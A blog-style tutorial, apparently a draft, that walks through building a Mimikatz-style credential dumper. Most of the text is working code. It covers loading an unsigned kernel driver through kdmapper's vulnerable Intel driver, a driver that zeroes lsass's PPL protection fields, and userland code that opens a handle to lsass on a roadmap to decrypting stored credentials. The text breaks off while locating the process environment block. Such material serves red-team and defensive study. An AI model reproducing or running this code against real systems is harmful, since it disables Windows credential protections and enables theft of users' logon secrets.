# Mimikatz for Dummies

Before getting into this article I want to shoutout these resources particular that made this project possible:
*  [Maldev Academy](https://maldevacademy.com/)
* [Exploring Mimikatz - Part 1 - WDigest - XPN InfoSec Blog](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
* [Uncovering Mimikatz 'msv' and collecting credentials through PyKD :: — uf0](https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/)
* [YOUR FIRST KERNEL DRIVER (FULL GUIDE)](https://www.youtube.com/watch?v=n463QJ4cjsU&t=4319s)
These resources really have helped lay the foundation for my knowledge in malware development, the Windows API, are all well written articles that go over a lot of the same principles discussed here, and honestly they probably do it better.

If you already feel comfortable in these topics then I highly recommend checking out the resources above.  If you have some experience dabbling in the Windows API and have always been curious how Mimikatz works, but dont really know where to start, then give this article a read!

# Setup

blah
# Protections

Before we get into writing code to exploit lsass, we first need to understand what we're up against. Tackling [Credential Guard]([How Credential Guard works | Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works)) will be done in another project, for now I'm focusing on simply dealing with LSA Protection.  I do however highly recommend reading up on Credential Guard, and how it may impact you.

## LSA Protection

Starting in Windows 8.1, LSA Protection (Process Protection Light) only allows trusted code to load into a protected process:

	LSA protection is a security feature that defends sensitive information like credentials from theft by blocking untrusted LSA code injection and process memory dumping. LSA protection runs in the background by isolating the LSA process in a container and preventing other processes, like malicious actors or apps, from accessing the feature. This isolation makes LSA protection a vital security feature, which is why it's enabled by default in Windows 11.

[Configure added LSA protection | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#lsa-and-credential-guard)'

	In Windows 8.1, a new concept of protected service has been introduced to allow anti-malware user-mode services to be launched as a protected service. After the service is launched as protected, Windows uses code integrity to only allow trusted code to load into the protected service. Windows also protects these processes from code injection and other attacks from admin processes.
[Protecting anti-malware services - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#introduction)


When a process is not protected, we as the attacker are able to open a process handle to the unprotected process which allows us to pretty easily read and write within its memory address space.  In the case of Mimikatz, once you're an administrator you escalate to `SYSTEM` privileges and gain the `SeDebugPrivilege` token which makes this possible on lsass.

```pwsh
mimikatz # privilege::debug (SeDebugPrivilege to tamper with other processes)
mimikatz # token::elevate (Become SYSTEM since lsass is a SYSTEM process)
```

When a process is run with PPL enabled however, this is no longer possible.

## LSA Protection Workaround


The workaround to LSA protection is at the kernel level.  The `EPROOCESS` struct is an [opaque]([Windows Kernel Opaque Structures - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess?redirectedfrom=MSDN))  
kernel level structure, opaque meaning intentionally unavailable through traditional means to the user, responsible for telling Windows, among other things, whether or not this process is protected or not.

The WIndows kernel keeps a list of all the processes running on a machine in a double-linked list, which as I've come to learn are a common data structure in the Windows kernel and in Lsass.  This list is stored within a global kernel variable called `PsActiveProcessHead`, of type `LIST_ENTRY`

The `LIST_ENTRY` struct is important to understand now since we'll be seeing it later.  Really what you need to know is that `Flink` is a pointer to the next list entry, and `Blink` is the previous.  Generally the way you go about "walking" one of these lists is to store the address of the `LIST_ENTRY` head, or the first entry, and then `Flink` through the list.  Eventually once you've looped through the list the address stored in `Flink` will equal that of the original head entry.
```c
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink; // Pointer to the next entry in the list
    struct _LIST_ENTRY *Blink; // Pointer to the previous entry in the list
} LIST_ENTRY, *PLIST_ENTRY;

```

We can view active processes in Windgb which is going to walk through the `PsActiveProcessHead` we talked about above using the `!process` [command]([!process (WinDbg) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-process)).

```
!process 0 0 (0 0 = display all processes, brief info)
```

So we can see what that looks like:

![[Pasted image 20250901185437.png]]

Or if we want a specific process:

![[Pasted image 20250901185546.png]]

The `PROCESS` string is a pointer to the `EPROCESS` structure in kernel memory.  To display contents of a variable in Windbg, we use `dt` ([display type]([dt (Display Type) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/dt--display-type-)))


```
dt [module]![variable name]
dt nt!* (wildcards are supported with dt)
dt nt!_EPROCESS [ADDRESS] (When you know the address of a strcut you can interprit it as such)
```


![[Pasted image 20250901185907.png]]

Here we see the `EPROCESS` struct being pulled from `nt` or [`ntoskrnl`]([Is That Ntoskrnl.exe Malware? How To Identify And Remove Fakes](https://malwaretips.com/blogs/ntoskrnl-exe-what-is-ntoskrnl-exe-should-i-remove-it/)).  While Windbg shows us what we need and makes it easier once we're in our program, sometimes research is best done online through sites like [vergiliusproject.com]([Vergilius Project | _EPROCESS](https://www.vergiliusproject.com/kernels/x64/windows-11/21h2/_EPROCESS)) or sites similar that contain online databases of Windows structures.


![[Pasted image 20250901190227.png]]


Here we can see that its of type [`PS_PROTECTION`.]([Vergilius Project | _PS_PROTECTION](https://www.vergiliusproject.com/kernels/x64/windows-11/21h2/_PS_PROTECTION)) 

`PS_PROTECTION` field explanations from: https://www.alex-ionescu.com/?p=146 and [Debugging Protected Processes | itm4n's blog](https://itm4n.github.io/debugging-protected-processes/)

```c
//0x1 bytes (sizeof) 
struct _PS_PROTECTION { 
	union { 
		UCHAR Level; //0x0 
		struct {
			UCHAR Type:3; //Protection Level
			UCHAR Audit:1; //Signature Valid
			UCHAR Signer:4; //DLLs Signatures Valid
		}; 
	};
};
```

The field responsible for protection is `Type`.
```
Type = 0 [Unprotected]
Type = 3 [Protected]
```

You can view your processes protection level simply by clicking the Windbg link for `Protection`

![[Pasted image 20250901191343.png]]

Or can you try and pull it manually like this:

```
dt nt!_PS_PROTECTION ffffa886aba20080+0x87a
```
![[Pasted image 20250901191454.png]]
![[Pasted image 20250901191849.png]]

So if we patch this to zero, our process the target process is unprotected, and our usermode land application can retrieve a file handle and perform read and write operations to its memory address space.  One crucial piece of information that I've left out till now is that**you cant actually read or write to these memory addresses without a kernel driver.**  They live in the kernel's memory address space, not in userland.

![[Pasted image 20250901192321.png]]

If we write a driver however, and find a way to load it without a signature, then we can unprotect processes at will, and read and write to kernel memory. 
### Driver Protections

Drivers are the pieces of code responsible for interacting with the kernel.  They translate the needs and desires of the user into operands that can be understood by your machines hardware.  They can also act as an intermediary between usermode applications, and kernel mode applications, bridging the gap between the two circles you see in the image above.

Because they are responsible for so much, and are crucial to the operability of your machine, Windows requires drivers to be signed before being released to the public, and before being loaded by the OS.  

[Signing a Driver - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/develop/signing-a-driver)

[`kdmapper`]([TheCruZ/kdmapper: KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory](https://github.com/TheCruZ/kdmapper)) is a tool that bypasses this constraint and allows you to map non-signed drivers in memory through a vulnerability in iqvw64e.sys.  With this tool we can load a kernel driver into memory without a signature, interact with it, and remove process protections on `lsass.exe`.

# Writing a Kernel Driver

When I was writing my first kernel driver I heavily relied on cazz's video, linked [here]([YOUR FIRST KERNEL DRIVER (FULL GUIDE)](https://www.youtube.com/watch?v=n463QJ4cjsU&t=4319s)).


Using [`DeviceIOControl`]([DeviceIoControl function (ioapiset.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol)) we can send data directly to our driver in kernelland, for our userland process.

We can specify a variety of different actions that we want our driver to take at different times by passing `IO Control Codes` or  IOCTLs.  This program has IOCTLs for the following:
1. Attach
2. Unprotect Process
3. Read memory
4. Write memory
5. Unprotect process
6. Find LogonSessionList and AES/DES Key base addreses
7. Detach

## Attach

To attach to a process we use [`PsLookupProcessByProcessId`]([PsLookupProcessByProcessId function (ntifs.h) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid)).  By supplying a PID which we can find in userland, we can recieve a pointer to that processes `EPROCESS` struct which we know will let us unprotect the process, and allows us to work within the bounds of that processes address space for the rest of program execution.

In C the `EPROCESS` struct is referred to as `PEPROCESS`.  Once we've recieved our `EPROCESS` pointer we can apply the known offset to the `Protection` struct of `0x87a` to find the `PROCESS_PROTECTION_INFO` struct holding our PPL values.


In order to actually tell our driver to do something from userland we need to send the corresponding IOCTL code, like we talked about above.


```c
namespace codes {
	//IOCTL codes - drivers to communicate w/ usermode apps and vice versa. 
	//UserMode applications call DeviceIoControl to send a struct -> drivers.
	//Then we recieve the struct and do whatever we want with it.
	//Must be buffered IO so we can send buffers between kernel and userland.
	constexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //setup the driver

	constexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //read process mem

	constexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.

	constexpr ULONG getProtection = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //retreieve protections on process  process mem.
	
	constexpr ULONG unprotect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //unprotect process mem.

	constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.

	constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //find logonsessionlist.
	
	constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //.

}
```

Here we define a list of IOCTL codes using the `CTL_CODE` macro.  Each action gets a unique number, and depending what code we pass to the driver, we can map a different function on the receiving end to run in kerneland.

```c
struct Patterns {
	PVOID pLogonSessionListPattern;
	PVOID pKeysPattern;
};
struct Request {
	HANDLE hPID; //
	PVOID pTargetMemory; //victim process
	PVOID pBuffer;
	SIZE_T sSize;
	SIZE_T sReturn_size;
	PVOID pBase;
	PVOID pEnd;
	Patterns Patterns;
};
...
...
...
bool attachToProcess(const DWORD PID, HANDLE hDriver) {
	Request req;
	req.hPID = (HANDLE)(PID); //because the function in kernel land wants a handle of the PID...
	return DeviceIoControl(hDriver, codes::attach, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
}
```

Passing data to and from a driver can be cumbersome, so it makes more sense to define a structure to hold off the data that we want going to from the driver so we only need to work with one variable as opposed to multiple IOCTL calls since we can really only return one data structure at a time.


Then on driver's side we start off in `DriverEntry()`.  This is like `main()` in traditional programs.

```c
//kdmapper calls DriverEntry
NTSTATUS DriverEntry() {
	//Drivers dont like const char* , they like UNICODE_STRING.  Use this method to initialize.
	UNICODE_STRING uDriverName = {};
	//Name must be \\Driver\\<WHATEVER>
	RtlInitUnicodeString(&uDriverName, L"\\Driver\\noah");
	return IoCreateDriver(&uDriverName, DriverMain); 
}
```
Because our driver is being loaded illegitimacy through kdmapper, we need a way of creating a Driver handle, registry paths, doing all of the backend work that Windows would normally do.   `IoCreateDriver` handles all of that for us, making a new driver (of type  `DRIVER_OBJECT`) with the name of your choice, and then entering  the `DriverMain()` function.


```c
NTSTATUS DriverMain(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

	//Because kdmapper is trying to load our kernel without 'windows knowing' or through traditional means, we need IoCreateDriver because that creates the DriverObject and registry path for us, it makes everythign fall back into alignment w how things wouold be done traditionally.
	UNREFERENCED_PARAMETER(RegistryPath); //we're never going to use this and warnings dont let us compile drivers.
	//Create the drivers device.
	UNICODE_STRING uDeviceName = { };
	RtlInitUnicodeString(&uDeviceName, L"\\Device\\noah"); //driver name always reamins the same.

	if (status != STATUS_SUCCESS) {
		debug_printer("FAILED TO CREATE DRIVER DEVICE....\n");
		return status;
	}

	debug_printer("Driver device succesfully created...\n");

	//Sym link

	UNICODE_STRING uSymLink = {};
	RtlInitUnicodeString(&uSymLink, L"\\DosDevices\\noah"); //driver name always reamins the same.
```

So theres an important distinction between a driver and a device.  A driver does not need a device.  A device does need a driver.  The device is a part of the driver, and its primary roll is to interact with userland.  We could make a driver without a device and that would be syntatically fine, however we wouldn't have a way of talking to usermode.

How does usermode interact with this device?  Its through the SymLink that you see above.  Usermode applications cannot see any of the drivers in the `\Device` namespace, however it can interact with the `\DosDevices` namespace, hence why our device will be stored there and linked back to our kernel driver.

After we setup our SymLink we setup crucial some crucial flags that dictate how the driver works at a high level

```c
	...
	SetFlag(pDeviceObject->Flags, DO_BUFFERED_IO);
	//Setup handlers for driver object -> setup functions that handle calls from OS.
	//Driver event handeling:
	DriverObject->MajorFunction[IRP_MJ_CREATE] = driver::create; //When a call is made to the driver it looks to these functions on what to do.
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = driver::close; //When a call is made to the driver it looks to these functions on what to do.
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = driver::device_control; //When a call is made to the driver it looks to these functions on what to do.
	
	ClearFlag(pDeviceObject->Flags, DO_DEVICE_INITIALIZING);//clearing this means we are now intiialized.
	
	debug_printer("Driver device initialized...\n");
	
	
	return status;
	}
```


`DO_BUFFERED_IO` is exactly what it sounds like, we can send buffers in and out of the driver.  Each driver has different `MajorFunctions`.  We can specify what code runs when any of these major events happens, like the driver is created, closed, or when we recieve and IOCTL code.

When the driver is created we run `driver::create`, closed we run `driver::close`, and when we receive IOCTL codes, we run `driver::device_control`.

Then we initialize the driver.  The driver now waits for IOCTL codes and acts accordingly.  IOCTL codes are sent through a `Input Output Request Packets` or `IRP`.

```c
NTSTATUS device_control(PDEVICE_OBJECT pDeviceObject, PIRP irp) { 		//irp is the packet that carries the data between ICTL devices.
	UNREFERENCED_PARAMETER(pDeviceObject);
	debug_printer("Device Control Called...\n");
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	//get stack location of IRP to find which code is being passed.
	PIO_STACK_LOCATION stack_IRP = IoGetCurrentIrpStackLocation(irp);
	//this holds control codes (attach/read/write)
	//we also need request struct:
	auto request = reinterpret_cast<Request*>(irp->AssociatedIrp.SystemBuffer);

	if (request == nullptr || stack_IRP == nullptr) {
		IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
		return status;
	}
```

Here you can see that when we recieve a IOCTL we recieve the data, and then cast it to our Request struct from earlier so we can properly read the data and act on it.

The next step is defining our actual IOCTL code actions, like `attach`, `detach`, ect.  Below shows the attach process:

```c
	static PEPROCESS target_process = nullptr; //this is static and survives after the fucntions been run so we can attach once, and use the same PEPROCESS object later.
	static PROCESS_PROTECTION_INFO* psProtection = nullptr;
	const ULONG control_code = stack_IRP->Parameters.DeviceIoControl.IoControlCode;
	
	switch (control_code) {
	case codes::attach:
		status = PsLookupProcessByProcessId(request->hPID, &target_process);
		psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)target_process)+ 0x87a);
	break;
	...
	...
	...
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = sizeof(Request); //THIS NMEEDS TO BE THE WHOLE STRUCT!!!! NOT just req
	IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
	//if theres a null ptr computer blue screens..
	return status; //OS/User can both see what status is when these handlers are called.
	}
}
```

Using a PID passed by userland on the command to attach, the driver reads the Request struct from IRP shown above, and pulls the process handle.  This allows us to find pointers to the `EPROCESS` struct and the `PROCESS_PROTECTION_INFO` struct.

Then at the end of every IOCTL we call `IoCompleteRequest`.

## Unprotect

You can see in the `driver::attach` code segment above, we're defining `target_process` and `psProtection` as static variables.  They wont change after they're found the first time.  We simply call back to the `psProtection` struct which was populated during the attach process and set the correct values to unprotect our process:

```c
case codes::unprotect:
	if (target_process != nullptr && psProtection != nullptr) {
		psProtection->SignatureLevel = 0;
		psProtection->SectionSignatureLevel = 0;
		psProtection->Protection.Type = 0; // accessing Type from the PS_PROTECTION struct
		psProtection->Protection.Signer = 0; // same thing with Signer
		debug_printer("Removed signature and protection...\n");
		status = STATUS_SUCCESS;

	}
	break;
```


# Userland Code
## Driver Setup

Now with the process unprotected, we're ready to make the jump into userland!  We'll get into Lsass functionality soon but first we'll quickly cover setting up our driver:

```c
int main(int argc, wchar_t* argv[]) {
	//Driver stuf...
	const HANDLE hDriver = CreateFile(L"\\\\.\\noah", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("ERROR W DRIVER HANDLE");
		return 1;
	}
	DWORD TargetPID;
	HANDLE hTarget;
	if (!GetRemoteProcessHandle(&hTarget, &TargetPID)) {
		printf("Failed to get process handle!\n");
		return 0;
	}
	PVOID pERPROCESS = NULL;
	//Driver is attaching to target process via PID.
	if (driver::attachToProcess(TargetPID, hDriver) == true) {
		printf("Attached!\n");
	}
	//Driver is now attached and we need to parse through process memory.

	if (driver::unprotect(hDriver) == true) {
		printf("Removed protections from target process...\n");
	}
	...
```

You can see us running `CreateFile` pointed at `\\\\.\\noah` which translates to `\\.\noah` without escape characters.  This is equivalent to saying `\\DosDevices\noah` which is the path we specified in our driver code.   This `HANDLE` is how Windows knows where to send our IRP requests.  

Then we run `GetRemoteProcessHandle` which opens a process handle to `lsass.exe`

Finally we attach to the process and then unprotect it.

## GetRemoteProcessHandle

Before getting a process handle we first need to find it.  This can be done many different ways, I chose to use `NtQuerySystemInformation` because its a little less overt then a common enumeration function like [`EnumProcesses`]([EnumProcesses function (psapi.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses)=)


```c
NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
```
The `SYSTEM_INFORMATION_CLASS`  struct specifies what kind of information you want returned from this function.  Passing `SystemProcessInformation` really just tells the function we don't need any additional information, the baseline operation of the function is enough.


```c
//Target Process
const wchar_t* wProc = L"lsass.exe";
const wchar_t* wTargetDLL = L"C:\\Windows\\system32\\lsasrv.dll";
...
...
bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll"); //i know these strings r baddddd
	fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

	if (!hNtdll) {
		printf("Failure finding module...");
		return false;
	}
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation"); //i should probabyl do some kind fo encoding for this..

	if (!pNtQuerySystemInformation) {
		printf("Failure finding fucntions...");
		return false;
	}
```

First we get a module handle to `Ntdll.dll` so that we can find a pointer to the `NtQuerySystemInformation` function and call it.


```c
	ULONG ReturnLength1 = 0x00; //needed buffer size for systemprocessinformation buffer
	ULONG ReturnLengthSystemInfo = 0x00; //actual returned buffer size for systemprocess information
	//first call tells us how big it needs to be..
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength1); //Now we're getting system proc info..

	//Second call populates..
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);

	NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation, ReturnLength1, &ReturnLengthSystemInfo); //Now we're getting system proc info..

	if (!pSystemProcessInformation && status != 0x00) {
		printf("SystemProcessInformation is empty...");
		return 0;
	}
```

The `SYSTEM_PROCESS_INFORMATION` struct contains a lot of system process data.  It contains PIDs, names, creation times, threads, PIDS, ect.  We can loop through the processes captured within this strcut to find our target process and open a new file handle with` PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION` privileges.

```c
	while (true) {
		if (pSystemProcessInformation->ImageName.Length && wcscmp(pSystemProcessInformation->ImageName.Buffer, wProc) == 0) { //make sure the process ahs a name 
			// openning a handle to the target process and saving it, then breaking 
			wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", pSystemProcessInformation->ImageName.Buffer, pSystemProcessInformation->UniqueProcessId);
			*hTarget = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pSystemProcessInformation->UniqueProcessId);
			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;
			break;
		}
		if (!pSystemProcessInformation->NextEntryOffset) {
			printf("Broken?");
			break;
		}
		// moving to the next element in the array
		pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
	}
	//https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess?redirectedfrom=MSDN
	return true;
}
```

With this `hTarget` now contains a `HANDLE` to lsass.exe!

# Lsass Operations

If you're still here, thank you for your time.  If you skipped down here, you're smarter then me when I started this project and I applaud you :)

Heres the general roadmap on what we need to do:
1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space
6. Find `LogonSessionList` pattern match address in lsasrv.dll
7. Find AES/DES/IV Key pattern match address in lsasrv.dll
8. Read through LogonSessionList for encrypted security blobs
9. Extract AES / DES / IV Keys
10. Decrypt encrypted security blob
11. MONEY!

I know thats a lot, but just stay with me!


## Finding Lsasrv

`Lsasrv.dll` stores all of the credentials and keys in memory that we're looking for.  We need to find the base address of Lsasrv so that we have a basis to start searching for everything.  To do this we can examine the lsass process's Process Environment Block (PEB).

Every process has a [PEB]([PEB: Where Magic Is Stored – Malware and Stuff](https://malwareandstuff.com/peb-where-magic-is-stored/)) stored in its usermode memory space that looks like this:

```
dt nt!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
   +0x003 IsPackagedProcess : Pos 4, 1 Bit
   +0x003 IsAppContainer   : Pos 5, 1 Bit
   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit
   +0x004 Padding0         : [4] UChar
   +0x008 Mutant           : Ptr64 Void
   +0x010 ImageBaseAddress : Ptr64 Void
   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA
   +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS
   +0x028 SubSystemData    : Ptr64 Void
   +0x030 ProcessHeap      : Ptr64 Void
   +0x038 FastPebLock      : Ptr64 _RTL_CRITICAL_SECTION
   +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER
   +0x048 IFEOKey          : Ptr64 Void
   +0x050 CrossProcessFlags : Uint4B
   +0x050 ProcessInJob     : Pos 0, 1 Bit
   +0x050 ProcessInitializing : Pos 1, 1 Bit
   +0x050 ProcessUsingVEH  : Pos 2, 1 Bit
   +0x050 ProcessUsingVCH  : Pos 3, 1 Bit
   +0x050 ProcessUsingFTH  : Pos 4, 1 Bit
   +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit
   +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit
   +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit
   +0x050 ReservedBits0    : Pos 8, 24 Bits
   +0x054 Padding1         : [4] UChar
   +0x058 KernelCallbackTable : Ptr64 Void
   +0x058 UserSharedInfoPtr : Ptr64 Void
   +0x060 SystemReserved   : Uint4B
   +0x064 AtlThunkSListPtr32 : Uint4B
   +0x068 ApiSetMap        : Ptr64 Void
   +0x070 TlsExpansionCounter : Uint4B
   +0x074 Padding2         : [4] UChar
   +0x078 TlsBitmap        : Ptr64 Void
   +0x080 TlsBitmapBits    : [2] Uint4B
   +0x088 ReadOnlySharedMemoryBase : Ptr64 Void
   +0x090 SharedData       : Ptr64 Void
   +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void
   +0x0a0 AnsiCodePageData : Ptr64 Void
   +0x0a8 OemCodePageData  : Ptr64 Void
   +0x0b0 UnicodeCaseTableData : Ptr64 Void
   +0x0b8 NumberOfProcessors : Uint4B
   +0x0bc NtGlobalFlag     : Uint4B
   +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER
   +0x0c8 HeapSegmentReserve : Uint8B
   +0x0d0 HeapSegmentCommit : Uint8B
   +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B
   +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B
   +0x0e8 NumberOfHeaps    : Uint4B
   +0x0ec MaximumNumberOfHeaps : Uint4B
   +0x0f0 ProcessHeaps     : Ptr64 Ptr64 Void
   +0x0f8 GdiSharedHandleTable : Ptr64 Void
   +0x100 ProcessStarterHelper : Ptr64 Void
   +0x108 GdiDCAttributeList : Uint4B
   +0x10c Padding3         : [4] UChar
   +0x110 LoaderLock       : Ptr64 _RTL_CRITICAL_SECTION
   +0x118 OSMajorVersion   : Uint4B
   +0x11c OSMinorVersion   : Uint4B
   +0x120 OSBuildNumber    : Uint2B
   +0x122 OSCSDVersion     : Uint2B
   +0x124 OSPlatformId     : Uint4B
   +0x128 ImageSubsystem   : Uint4B
   +0x12c ImageSubsystemMajorVersion : Uint4B
   +0x130 ImageSubsystemMinorVersion : Uint4B
   +0x134 Padding4         : [4] UChar
   +0x138 ActiveProcessAffinityMask : Uint8B
   +0x140 GdiHandleBuffer  : [60] Uint4B
   +0x230 PostProcessInitRoutine : Ptr64     void 
   +0x238 TlsExpansionBitmap : Ptr64 Void
   +0x240 TlsExpansionBitmapBits : [32] Uint4B
   +0x2c0 SessionId        : Uint4B
   +0x2c4 Padding5         : [4] UChar
   +0x2c8 AppCompatFlags   : _ULARGE_INTEGER
   +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER
   +0x2d8 pShimData        : Ptr64 Void
   +0x2e0 AppCompatInfo    : Ptr64 Void
   +0x2e8 CSDVersion       : _UNICODE_STRING
   +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   +0x308 SystemDefaultActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA
   +0x310 SystemAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP
   +0x318 MinimumStackCommit : Uint8B
   +0x320 SparePointers    : [4] Ptr64 Void
   +0x340 SpareUlongs      : [5] Uint4B
   +0x358 WerRegistrationData : Ptr64 Void
   +0x360 WerShipAssertPtr : Ptr64 Void
   +0x368 pUnused          : Ptr64 Void
   +0x370 pImageHeaderHash : Ptr64 Void
   +0x378 TracingFlags     : Uint4B
   +0x378 HeapTracingEnabled : Pos 0, 1 Bit
   +0x378 CritSecTracingEnabled : Pos 1, 1 Bit
   +0x378 LibLoaderTracingEnabled : Pos 2, 1 Bit
   +0x378 SpareTracingBits : Pos 3, 29 Bits
   +0x37c Padding6         : [4] UChar
   +0x380 CsrServerReadOnlySharedMemoryBase : Uint8B
   +0x388 TppWorkerpListLock : Uint8B
   +0x390 TppWorkerpList   : _LIST_ENTRY
   +0x3a0 WaitOnAddressHashTable : [128] Ptr64 Void
   +0x7a0 TelemetryCoverageHeader : Ptr64 Void
   +0x7a8 CloudFileFlags   : Uint4B
   +0x7ac CloudFileDiagFlags : Uint4B
   +0x7b0 PlaceholderCompatibilityMode : Char
   +0x7b1 PlaceholderCompatibilityModeReserved : [7] Char
   +0x7b8 LeapSecondData   : Ptr64 _LEAP_SECOND_DATA
   +0x7c0 LeapSecondFlags  : Uint4B
   +0x7c0 SixtySecondEnabled : Pos 0, 1 Bit
   +0x7c0 Reserved         : Pos 1, 31 Bits
   +0x7c4 NtGlobalFlag2    : Uint4B
```


Because this structure is stored in usermode memory, we can access this structure to retrieve crucial information about remote and local processes.  At offset +0x18 you'll see a pointer to a `PEB_LDR_DATA` structure.

```
   +0x018 Ldr              : Ptr64 _PEB_LDR_DATA
```

What is this structure?  The `PEB_LDR_DATA` structure holds a `LIST_ENTRY` struct for all of the modules loaded in the process you're examining.  So if we can loop through this list, we can search for Lsasrv and get its location in memory, hence why we need to find the PEB.

```c
typedef struct _PEB_LDR_DATA {
    ULONG Length;                          // Size of this structure
    BOOLEAN Initialized;                   // Indicates if the structure is initialized
    PVOID SsHandle;                        // Reserved
    LIST_ENTRY InLoadOrderModuleList;      // List of modules in load order
    LIST_ENTRY InMemoryOrderModuleList;    // List of modules in memory order
    LIST_ENTRY InInitializationOrderModuleList; // List of modules in initialization order
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```
## Finding the PEB

So we've established we need to find the PEB in order to find Lsasrv. How do we find the PEB?

```c
bool locatePEB(HANDLE hTarget, PVOID* pPEB) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return false;

	printf("NTDLL Handle\n");
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	
